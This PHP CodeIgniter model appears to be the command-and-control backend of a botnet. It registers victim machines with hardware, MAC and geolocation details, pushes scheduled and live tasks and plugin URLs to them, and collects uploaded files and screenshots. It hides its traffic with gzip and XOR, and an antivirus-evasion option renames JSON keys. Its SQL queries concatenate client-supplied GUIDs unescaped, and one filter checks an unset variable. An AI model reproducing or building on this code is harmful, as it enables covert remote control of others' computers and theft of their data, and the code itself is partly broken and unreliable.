<?php
if (!defined('BASEPATH')) {
    die('No direct script access allowed');
}
class Bot_mdl extends CI_Model
{
    public $api_post = array();
    public $tasktype = 'cron';
    public $json_data = '';
    public $thistime;
    public $lastip;
    public $pnetbot = array();
    public $guid;
    public $mc_time = 6000;
    public $netbots = array();
    public $error_msg = '';
    public $ms = array();
    public $tl_info = array();
    public function __construct()
    {
        parent::__construct();
        $this->thistime = date('Y-m-d H:i:s');
        $this->lastip = $this->input->ip_address();
        $this->mc_time = $this->config->item('mc_time');
        $this->ms = $this->config->item('ms_tx');
        $this->api_post = $_POST;
        $this->guid = $this->input->post($this->ms['guid']);
    }
    
    public function t()
    {
        $ms_lng = $this->config->item('ms_tx');
        $max_online = $this->config->item('max_online');
        $tasklist = array();
        $netbot = array();
        $netbot_up = array();
        $back_msg = '';
        $back_code = 0;
        // [$ms_lng['']]
        $this->tasktype = 'cron';
        
         if (empty($this->api_post[$ms_lng['size']]) || empty($this->api_post[$ms_lng['data']])) {
         //show_404(); 
         show_error('T' ,500,'Error');       	
         }
            
        //memcached  没有数据跳到最后
        if (!empty($this->guid)) {
            $mc_netbot = $this->cache->get($this->guid);
            if (!empty($mc_netbot)) {
                if ($mc_netbot['nb_task_new'] == 0) {
                    $netbot = $mc_netbot;
                    goto end;
                }
            }
        }
        //memcached
        //解开数据
        $unzip = $this->unzip();
        if (!$unzip) {
            goto end;
        }
        //获取机器信息
        if (empty($mc_netbot)) {
            $netbot = $this->get_netbot($this->guid);
        } else {
            $netbot = $mc_netbot;
        }
        if (empty($netbot)) {
            //注册GUID
            $tasklist = $this->reg($this->guid);
            $back_code = 1;
            goto regend;
        }
        $this->netbots = $netbot;
        //读取任务队列
        $tasklist = $this->get_tl_cron();
        if (!empty($tasklist)) {
            $netbot_up['nb_task_new'] = 1;
            $netbot['nb_task_new'] = 1;
            //更新数据为已发送状态
            foreach ($tasklist as $key => $tl) {
                $this->db->query('update  tasklist_cron set tl_stauts=1  where tl_id=' . $tl[$ms_lng['tl_id']]);
                
               if($this->config->item('miansha')){
                if ($tl[$ms_lng['tl_app']] == 'netbot' && empty($tl[$ms_lng['tl_plug_md5']])) {
                    if (!empty($tl[$ms_lng['tl_vars']])) {
                        $result_var = json_decode($tl[$ms_lng['tl_vars']]);
                        if ($result_var) {
                            $ms_cs = $this->config->item('ms_cs');
                            $var_json = $tl[$ms_lng['tl_vars']];
                            foreach ($ms_cs as $lkey => $lvar) {
                                $key_old = '"' . $lkey . '":';
                                $key_new = '"' . $lvar . '":';
                                $var_json = str_replace($key_old, $key_new, $var_json);
                            }
                            $tasklist[$key][$ms_lng['tl_vars']] = $var_json;
                        }
                    }
                    $tasklist[$key][$ms_lng['tl_function']] = $ms_lng[$tl[$ms_lng['tl_function']]];
                }
                if ($tl[$ms_lng['tl_app']] == 'netbot') {
                    $tasklist[$key][$ms_lng['tl_app']] = $ms_lng[$tl[$ms_lng['tl_app']]];
                }
              }
                
            }
            $back_code = 1;
        } else {
            $netbot_up['nb_task_new'] = 0;
            $netbot['nb_task_new'] = 0;
            $back_msg = 'no data!';
        }
        end:
        if ($this->error_msg == '') {
            $netbot_up['nb_stauts'] = 1;
            //停止激活
            if ($netbot['nb_stauts'] == 2) {
                $this->cl_del($this->guid);
            }
            $netbot['nb_stauts'] = 1;
            //更新数据和缓存
            $netbot_up['nb_lasttime'] = $this->thistime;
            $netbot_up['nb_lastip'] = $this->lastip;
            $netbot_up['nb_lasturl'] = $_SERVER['HTTP_HOST'];
            $netbot['nb_lasturl'] = $_SERVER['HTTP_HOST'];
            $netbot['nb_lasttime'] = $this->thistime;
            $netbot['nb_lastip'] = $this->lastip;
            $this->cache->save($this->guid, $netbot, $this->mc_time);
            $this->update_netbot($this->guid, $netbot_up);
        } else {
            $back_msg = $this->error_msg;
        }
        regend:
     
            $this->show_json_task($tasklist, $back_code, $back_msg);
    
    }
    
    public function c()
    {
        $ms_lng = $this->config->item('ms_tx');
        $tasklist = array();
        $netbot = array();
        $netbot_up = array();
        $back_msg = '';
        $back_code = 0;
        $this->tasktype = 'chat';
        
       if (empty($this->api_post[$ms_lng['size']]) || empty($this->api_post[$ms_lng['data']])) {
         //show_404(); 
         show_error('C' ,500,'Error');       	
         }
        
        //memcached  没有数据跳到最后
        if (empty($this->guid)) {
            $this->error_msg = 'guid错误';
            goto end;
        }
        $mc_chat = $this->cache->get('chat' . $this->guid);
        if ($mc_chat === 0) {
            $this->error_msg = 'no data2!';
            goto end;
        }
        //memcached
        //解开数据
        $unzip = $this->unzip();
        if (!$unzip) {
            goto end;
        }
        $mc_netbot = $this->cache->get($this->guid);
        //获取机器信息
        if (empty($mc_netbot)) {
            $netbot = $this->get_netbot($this->guid);
        } else {
            $netbot = $mc_netbot;
        }
        $this->netbots = $netbot;
        //读取任务队列
        $tasklist = $this->get_tl_chat();
        if (!empty($tasklist)) {
            //更新数据为已发送状态
            foreach ($tasklist as $key => $tl) {
                $this->db->query('update  tasklist_chat set tl_stauts=1  where tl_id=' . $tl[$ms_lng['tl_id']]);
                
              if($this->config->item('miansha')){  
                if ($tl[$ms_lng['tl_app']] == 'netbot' && empty($tl[$ms_lng['tl_plug_md5']])) {
                    if (!empty($tl[$ms_lng['tl_vars']])) {
                        $result_var = json_decode($tl[$ms_lng['tl_vars']]);
                        if ($result_var) {
                            $ms_cs = $this->config->item('ms_cs');
                            $var_json = $tl[$ms_lng['tl_vars']];
                            foreach ($ms_cs as $lkey => $lvar) {
                                $key_old = '"' . $lkey . '":';
                                $key_new = '"' . $lvar . '":';
                                $var_json = str_replace($key_old, $key_new, $var_json);
                            }
                            $tasklist[$key][$ms_lng['tl_vars']] = $var_json;
                        }
                    }
                    $tasklist[$key][$ms_lng['tl_function']] = $ms_lng[$tl[$ms_lng['tl_function']]];
                }
                if ($tl[$ms_lng['tl_app']] == 'netbot') {
                    $tasklist[$key][$ms_lng['tl_app']] = $ms_lng[$tl[$ms_lng['tl_app']]];
                }
              }
            }
            $back_code = 1;
        } else {
            $this->cache->save('chat' . $this->guid, 0, 100);
            $this->error_msg = 'no data!';
        }
        end:
        $back_msg = $this->error_msg;
    
        $this->show_json_task($tasklist, $back_code, $back_msg);
       
    }
    
    public function p()
    {
        $ms_lng = $this->config->item('ms_tx');
        $netbot = array();
        $back_msg = '';
        $back_code = 0;
 
  if (empty($this->api_post[$ms_lng['size']]) || empty($this->api_post[$ms_lng['data']])) {
         //show_404(); 
         show_error('P' ,500,'Error');       	
         }
 
        //解开数据
        $unzip = $this->unzip(1);
        if (!$unzip) {
            goto end;
        }
        if (empty($this->guid)) {
            $this->error_msg = 'guid不正确';
            goto end;
        }
        $mc_netbot = $this->cache->get($this->guid);
        if (empty($mc_netbot)) {
            $netbot = $this->get_netbot($this->guid);
        } else {
            $netbot = $mc_netbot;
        }
        $this->netbots = $netbot;
        //调试日志
        $path_hash = $this->pnetbot['tl_id'];
        $file_path = $this->config->item('tasktmp_path') . '/' . $this->pnetbot['tl_type'];
        $file_path = $file_path . '/' . $path_hash . '.txt';
        write_file($file_path, $this->json_data);
        //调试日志
        $tlu = array();
        //$tlu['tl_data'] = $this->json_data;
        $tlu['tl_finishtime'] = date('Y-m-d H:i:s');
        $tlu['tl_stauts'] = 2;
        $tlu['tl_code'] = $this->pnetbot['code'];
        $tlu['tl_info'] = $this->pnetbot['info'];
        //进入回调函数处理
        //接收文件
        if (isset($_FILES[$ms_lng['taskfile']])) {
            $this->load->library('Uploadtask');
            $upfiles = new Uploadtask();
            $upfiles->upload_inputname = $ms_lng['taskfile'];
            $upfiles->upload_target_dir = $this->config->item('upload_path') . '/' . $this->pnetbot['tl_netbot'];
            if (empty($this->pnetbot['tl_id'])) {
                $upfiles->upload_target_name = $this->pnetbot['tl_type']."_".date('YmdHis') . rand(0, 100);
            } else {
                $upfiles->upload_target_name = $this->pnetbot['tl_type']."_".$this->pnetbot['tl_id'];
            }
            $taskfile = $upfiles->upload_file();
            if ($taskfile) {
                //抓屏不写文件队列
                if ($this->pnetbot['tl_backfun'] != 'Screen') {
                    $tasklistold = $this->db->query('SELECT * FROM tasklist_' . $this->pnetbot['tl_type'] . ' where tl_id=' . $this->pnetbot['tl_id'])->row_array();
                    //写文件日志
                    $file = array();
                    $file['tf_name'] = $taskfile['filename'];
                    $file['tf_size'] = $taskfile['filesize'];
                    $file['tf_addtime'] = date('Y-m-d H:i:s');
                    $file['tf_filetype'] = $taskfile['filetype'];
                    $file['tf_oldpath'] = $this->pnetbot['filepath'];
                    $file['tl_id'] = $this->pnetbot['tl_id'];
                    $file['tl_type'] = $this->pnetbot['tl_type'];
                    $file['tl_taskid'] = $this->pnetbot['tl_taskid'];
                    $file['tl_netbot'] = $this->pnetbot['tl_netbot'];
                    $file['tl_backfun'] = $this->pnetbot['tl_backfun'];
                    $file['username'] = @$tasklistold['username'];
                    $this->task_files_insert($file);
                }
                $tlu['tl_filename'] = $taskfile['filename'];
                $tlu['tl_oldpath'] = $this->pnetbot['filepath'];
            } else {
                $this->error_msg = 'upload fail';
                goto end;
            }
        }
        $json_data = $this->json_data;
        foreach ($ms_lng as $lkey => $lvar) {
            $key_old = '"' . $lkey . '":';
            $key_new = '"' . $lvar . '":';
            $json_data = str_replace($key_new, $key_old, $json_data);
        }
        $this->json_data = $json_data;
        if (!empty($this->pnetbot['tl_backfun'])) {
            if (file_exists(APPPATH . 'models/backfun/' . $this->pnetbot['tl_backfun'] . '_mdl.php')) {
                $this->load->model('backfun/' . $this->pnetbot['tl_backfun'] . '_mdl', 'go');
                $go = $this->go->go();
                if ($go != true) {
                    $this->error_msg = '回调过程出错！';
                    goto end;
                }
            }
        }
        //更新队列
        $this->tasklist_update($this->pnetbot['tl_id'], $tlu, $this->pnetbot['tl_type']);
        //抓屏不写结果
        if($this->pnetbot['tl_backfun']!="Screen"){
        $td = array();
        $td['tl_data'] = $this->json_data;
        $td['id'] = $this->pnetbot['tl_id'];
        $inserttable = 'taskdata_' . $this->pnetbot['tl_type'];
        $this->db->insert($inserttable, $td);
        }
        end:
        $back_msg = $this->error_msg;
     
            $this->show_json_task(null, $back_code, $back_msg);
        
    }
    
    public function get_tl_cron()
    {
        $g_task = $this->get_g_task();
        $c_task = $this->get_c_task();
        //合并计划任务
        $tasks = array_merge($g_task, $c_task);
        //循环计划任务数组 进行过滤计算
        foreach ($tasks as $key => $task) {
            // 带hash到队列查询数据
            $query = $this->db->query('SELECT  *   FROM  netbot_task  where guid=\'' . $this->guid . '\' and taskid=' . $task['t_id'] . ' and  hash=\'' . $task['t_hash'] . '\'   limit 1');
            $tl = array();
            $tl['tl_netbot'] = $this->guid;
            $tl['tl_taskid'] = $task['t_id'];
            $tl['tl_addtime'] = date('Y-m-d H:i:s');
            $tl['tl_stauts'] = 0;
            $tl['tl_isback'] = $task['t_isback'];
            $tl['tl_app'] = $task['t_app'];
            $tl['tl_function'] = $task['t_function'];
            $tl['tl_vars'] = $task['t_vars'];
            $tl['tl_type'] = 'cron';
            $tl['tl_backfun'] = $task['t_backfun'];
            $tl['tl_plug_url'] = $task['t_plug_url'];
            $tl['tl_plug_md5'] = $task['t_plug_md5'];
            $tl['tl_hash'] = $task['t_hash'];
            $tl['username'] = $task['username'];
            if ($query->num_rows() > 0) {
                $tasklist_cron = $query->row_array();
                //如果是可重复任务并且时间差已过
                if ($task['t_repeat'] && mysql_to_unix($tasklist_cron['lasttime']) < now() - $task['t_interval']) {
                    //写入队列  更新出发次数
                    $this->db->query('update  task set t_finish_num=t_finish_num+1  where t_id=' . $task['t_id']);
                    $this->db->query('update  netbot_task set lasttime=now()  where id=' . $tasklist_cron['id']);
                    $this->insert_tasklist_cron($tl);
                }
            } else {
                //写入队列  更新出发次数
                $this->db->query('update  task set t_finish_num=t_finish_num+1  where t_id=' . $task['t_id']);
                $this->db->query('insert into  netbot_task (guid,taskid,lasttime,hash) values (\'' . $this->guid . '\',\'' . $task['t_id'] . '\',now(),\'' . $task['t_hash'] . '\')');
                $this->insert_tasklist_cron($tl);
            }
        }
        //读取计划任务列表
        $ms_lng = $this->ms;
        $tasklist_cron = $this->db->query('SELECT tl_id as ' . $ms_lng['tl_id'] . ',tl_netbot as ' . $ms_lng['tl_netbot'] . ',tl_taskid as ' . $ms_lng['tl_taskid'] . ',tl_isback as ' . $ms_lng['tl_isback'] . ',tl_backfun as ' . $ms_lng['tl_backfun'] . ',tl_app as ' . $ms_lng['tl_app'] . ',tl_function as ' . $ms_lng['tl_function'] . ',tl_vars as ' . $ms_lng['tl_vars'] . ',tl_type as ' . $ms_lng['tl_type'] . ',tl_plug_md5 as ' . $ms_lng['tl_plug_md5'] . ',tl_plug_url as ' . $ms_lng['tl_plug_url'] . ' FROM tasklist_cron where tl_stauts=0 and tl_netbot=\'' . $this->guid . '\' ')->result_array();
        //读取及时任务列表
        //$tasklist_chat = $this->db->query('SELECT tl_id,tl_netbot,tl_taskid,tl_isback,tl_backfun,tl_app,tl_function,tl_vars,tl_type,tl_plug_md5,tl_plug_url FROM tasklist_chat where tl_stauts=0 and tl_netbot=\'' . $this->guid . '\' ')->result_array();
        //合并任务列表
        //$tasklist = array_merge($tasklist_cron, $tasklist_chat);
        $tasklist = $tasklist_cron;
        return $tasklist;
    }
    
    public function get_tl_chat()
    {
        $ms_lng = $this->ms;
        $tasklist = $this->db->query('SELECT tl_id as ' . $ms_lng['tl_id'] . ',tl_netbot as ' . $ms_lng['tl_netbot'] . ',tl_taskid as ' . $ms_lng['tl_taskid'] . ',tl_isback as ' . $ms_lng['tl_isback'] . ',tl_backfun as ' . $ms_lng['tl_backfun'] . ',tl_app as ' . $ms_lng['tl_app'] . ',tl_function as ' . $ms_lng['tl_function'] . ',tl_vars as ' . $ms_lng['tl_vars'] . ',tl_type as ' . $ms_lng['tl_type'] . ',tl_plug_md5 as ' . $ms_lng['tl_plug_md5'] . ',tl_plug_url as ' . $ms_lng['tl_plug_url'] . ' FROM tasklist_chat where tl_stauts=0 and tl_netbot=\'' . $this->guid . '\' order by tl_id asc')->result_array();
        return $tasklist;
    }
    
    public function reg($guid = '')
    {
        $ms_lng = $this->ms;
        $pnetbot = $this->pnetbot;
        if (empty($guid)) {
            $guid = MD5($pnetbot['mac'] . '|' . mt_rand(10000, 99999));
        }
        $ip = $this->lastip;
        $this->load->library('Geoip');
        $gi = geoip_open($this->config->item('data_path') . '/GeoIP.dat', GEOIP_STANDARD);
        $rearea = geoip_country_name_by_addr($gi, $ip);
        if (!$rearea) {
            $rearea = 'unknown';
        }
        geoip_close($gi);
        $netbot = array();
        $netbot['nb_guid'] = $guid;
        $netbot['nb_addtime'] = $this->thistime;
        $netbot['nb_lasttime'] = $this->thistime;
        $netbot['nb_lastip'] = $this->lastip;
        $netbot['nb_area'] = $rearea;
        $netbot['nb_vm'] = $pnetbot['vm'];
        $netbot['nb_amd64'] = $pnetbot['amd64'];
        $netbot['nb_cpu'] = $pnetbot['cpu'];
        $netbot['nb_mem'] = $pnetbot['mem'];
        $netbot['nb_mac'] = $pnetbot['mac'];
        $netbot['nb_internet'] = $pnetbot['internet'];
        $netbot['nb_os'] = substr($pnetbot['ver'], 0, strlen($pnetbot['ver']) - 2);
        $netbot['nb_vid'] = $pnetbot['id'];
        $netbot['nb_cname'] = $pnetbot['name'];
        $netbot['nb_lasturl'] = $_SERVER['HTTP_HOST'];
        $netbot['nb_url'] = $pnetbot['nb_url'];
        $netbot['nb_url_bak'] = $pnetbot['nb_url_bak'];
        $netbot['nb_group'] = 1;
        $netbot['nb_task_new'] = 1;
        $this->netbot_reg($netbot);
        $this->guid = $guid;
        $this->netbots = $netbot;
        $tl_function = "reg";
        $tl_vars = array();
        $tl_vars['guid'] = $guid;
        $task_vars = json_encode($tl_vars, JSON_UNESCAPED_UNICODE);
        $tl = array();
        $tl['tl_netbot'] = $guid;
        $tl['tl_taskid'] = 0;
        $tl['tl_addtime'] = $this->thistime;
        $tl['tl_stauts'] = 1;
        $tl['tl_isback'] = 1;
        $tl['tl_backfun'] = "Reg";
        $tl['tl_app'] = "netbot";
        $tl['tl_function'] = $tl_function;
        $tl['tl_vars'] = $task_vars;
        $tl['tl_type'] = 'cron';
        $this->db->insert('tasklist_cron', $tl);
        $tl['tl_id'] = $this->db->insert_id();
        
        $tl_vars = array();
        $tl_vars[$ms_lng['guid']] = $guid;
        $task_vars = json_encode($tl_vars, JSON_UNESCAPED_UNICODE);
        
        $tl2 = array();
        $tl2[$ms_lng['tl_netbot']] = $guid;
        $tl2[$ms_lng['tl_taskid']] = 0;
        $tl2[$ms_lng['tl_isback']] = 1;
        $tl2[$ms_lng['tl_backfun']] = "Reg";
        $tl2[$ms_lng['tl_app']] = $ms_lng['netbot'];
        $tl2[$ms_lng['tl_function']] = $ms_lng['reg'];
        $tl2[$ms_lng['tl_vars']] = $task_vars;
        $tl2[$ms_lng['tl_type']] = 'cron';
        $tl2[$ms_lng['tl_id']] = $tl['tl_id'];
        $tl2[$ms_lng['tl_plug_md5']] = '';
        $tl2[$ms_lng['tl_plug_url']] = '';
        $tasklist = array();
        $tasklist[] = $tl2;
        return $tasklist;
    }
    
    public function unzip($c = 0)
    {
        $ms_lng = $this->ms;
        $ms_jg = $this->config->item('ms_jg');
        $api_post = $this->api_post;
        $data_gz = $api_post[$ms_lng['data']];
        $data_size = $api_post[$ms_lng['size']];
        $len = strlen($data_gz);
        if ($len > $data_size) {
            $data_gz = substr($data_gz, 2, $len - 4);
        } else {
            if ($len < $data_size) {
                $this->error_msg = 'size error.';
                return false;
            }
        }
        $data_gz = td_xor_decode($data_gz);
        //解密
        $json_data = trim(gzuncompress($data_gz));
        $api_data_old = json_decode($json_data, true);
        if (!is_array($api_data_old)) {
            $this->error_msg = '数据格式不正确！';
            return false;
        }
        $ms_lng2 = array_flip($ms_lng);
        $api_data_new = array();
        foreach ($api_data_old as $okey => $oval) {
            $api_data_new[$ms_lng2[$okey]] = $oval;
        }
        if ($c == 1) {
            $tl_info = $this->tasklist_info($api_data_new['tl_id'], $api_data_new['tl_type']);
            if (!$tl_info) {
                $this->error_msg = '任务不存在！';
                return false;
            }
            $this->tl_info = $tl_info;
            
         if($this->config->item('miansha')){ 
            if ($api_data_new['data']) {
                if ($this->tl_info['tl_app'] == 'netbot' && empty($this->tl_info['tl_plug_md5'])) {
                    $result_data = json_decode($api_data_new['data']);
                    if ($result_data) {
                        foreach ($ms_jg as $lkey => $lvar) {
                            $key_old = '"' . $lkey . '":';
                            $key_new = '"' . $lvar . '":';
                            $api_data_new['data'] = str_replace($key_new, $key_old, $api_data_new['data']);
                        }
                    }
                }
            }
          }
          
            $this->tasktype = $api_data_new['tl_type'];
            $api_data_new['guid'] = $api_data_new['tl_netbot'];
        }
        $this->json_data = json_encode($api_data_new, JSON_UNESCAPED_UNICODE);
        $this->pnetbot = $api_data_new;
        if ($this->guid != $this->pnetbot['guid']) {
            $this->error_msg = 'guid不相等！';
            return false;
        }
        return true;
    }
    
    public function netbot_reg($data)
    {
        if ($this->db->insert('netbot', $data)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function get_netbot($guid)
    {
        $netbot = $this->db->query('SELECT * FROM netbot where nb_guid=\'' . $guid . '\'  limit 1')->row_array();
        return $netbot;
    }
    
    public function mc_get_netbot($nb_guid, $mc_time = 6000)
    {
        $netbot = $this->cache->get($nb_guid);
        if (empty($netbot)) {
            $this->db->select('*')->from('netbot')->where(array('nb_guid' => $nb_guid))->limit(1);
            $query = $this->db->get();
            if ($query->num_rows() == 1) {
                $data = $query->row_array();
                $this->cache->save($nb_guid, $data, $mc_time);
                return $data;
            } else {
                return false;
            }
        } else {
            return $netbot;
        }
    }
    
    public function mc_update_netbot($nb_guid, $data, $mc_time = 6000)
    {
        $this->db->where('nb_guid', $nb_guid);
        if ($this->db->update('netbot', $data)) {
            $netbot = $this->info($nb_guid);
            $this->cache->save($nb_guid, $netbot, $mc_time);
            return true;
        } else {
            return false;
        }
    }
    
    public function update_netbot($guid, $data)
    {
        $this->db->where('nb_guid', $guid);
        if ($this->db->update('netbot', $data)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function get_g_task()
    {
        $netbot = $this->netbots;
        //查询有效组计划任务
        $g_tasks = $this->db->query('SELECT * FROM task where t_stauts=1 and t_netbot<2  and   t_starttime < NOW() and t_endtime> NOW() ')->result_array();
        //循环数据 进行组交叉判断，无交叉删除数据项
        foreach ($g_tasks as $key => $g_task) {
            if ($g_task['t_group']) {
                $g_task_group = array();
                $g_task_group = json_decode($g_task['t_group'], true);
                if ($g_task['t_netbot'] == 1) {
                    //计算数组交集
                    $gexps = $this->db->query('SELECT nge_group_id FROM netbot_group_expand where nge_netbot_id=\'' . $netbot['nb_guid'] . '\'')->result_array();
                    $netbot_groups = array();
                    $netbot_groups[] = $netbot['nb_group'];
                    foreach ($gexps as $gexp) {
                        $netbot_groups[] = $gexp['nge_group_id'];
                    }
                    $groups_intersect = array_intersect($netbot_groups, $g_task_group);
                    //计算数组交集
                    //if (!in_array($netbot['nb_group'], $g_task_group))
                    if (empty($groups_intersect)) {
                        unset($g_tasks[$key]);
                        continue;
                    }
                }
                //地区过滤
                if ($g_task['t_area_type'] != 0) {
                    $t_area = json_decode($g_task['t_area'], true);
                    if ($g_task['t_area_type'] == 1) {
                        if (!in_array($netbot['nb_area'], $t_area)) {
                            unset($g_tasks[$key]);
                            continue;
                        }
                    } else {
                        if (in_array($netbot['nb_area'], $t_area)) {
                            unset($g_tasks[$key]);
                            continue;
                        }
                    }
                }
                //节点过滤
                if ($g_task['t_url_type'] != 0) {
                    $t_area = json_decode($g_task['t_url'], true);
                    if ($g_task['t_url_type'] == 1) {
                        if (!in_array($_SERVER['HTTP_HOST'], $t_url)) {
                            unset($g_tasks[$key]);
                            continue;
                        }
                    } else {
                        if (in_array($_SERVER['HTTP_HOST'], $t_url)) {
                            unset($g_tasks[$key]);
                            continue;
                        }
                    }
                }
                //操作系统过滤
                if ($g_task['t_os_type'] != 0) {
                    $t_os = json_decode($g_task['t_os'], true);
                    if ($g_task['t_os_type'] == 1) {
                        if (!in_array($netbot['nb_os'], $t_os)) {
                            unset($g_tasks[$key]);
                            continue;
                        }
                    } else {
                        if (in_array($netbot['nb_os'], $t_os)) {
                            unset($g_tasks[$key]);
                            continue;
                        }
                    }
                }
            }
        }
        return $g_tasks;
    }
    
    public function get_c_task()
    {
        //查询单机计划任务
        $c_tasks = $this->db->query('SELECT * FROM task where t_stauts=1 and t_netbot=2 and t_group=\'' . $this->guid . '\'  and   t_starttime < NOW() and t_endtime> NOW() ')->result_array();
        return $c_tasks;
    }
    
    public function insert_tasklist_cron($data)
    {
        if ($this->db->insert('tasklist_cron', $data)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function task_files_insert($data)
    {
        if ($this->db->insert('task_files', $data)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function tasklist_info($tl_id, $tl_type = 'cron')
    {
        $this->db->select('*')->from('tasklist_' . $tl_type)->where(array('tl_id' => $tl_id))->limit(1);
        $query = $this->db->get();
        if ($query->num_rows() == 1) {
            $data = $query->row_array();
            return $data;
        } else {
            return false;
        }
    }
    
    public function tasklist_update($id, $data, $type = 'cron')
    {
        $this->db->where('tl_id', $id);
        if ($this->db->update('tasklist_' . $type, $data)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function cl_up($guid, $data)
    {
        $this->db->where('guid', $guid);
        if ($this->db->update('chatlist', $data)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function cl_del($guid)
    {
        $sql = 'delete from  chatlist  where  guid=\'' . $guid . '\' ';
        if ($this->db->query($sql)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function show_json_task($data, $code = 1, $info = '')
    {
        $ms_lng = $this->ms;
        $result = array($ms_lng['code'] => $code, $ms_lng['info'] => $info, $ms_lng['data'] => $data);
        header('Content-Type: application/json; charset=utf-8');
        $result = json_encode($result, JSON_UNESCAPED_UNICODE);
        $result = gzcompress($result);
        $result = td_xor_encode($result);
        echo $result;
        die;
    }
}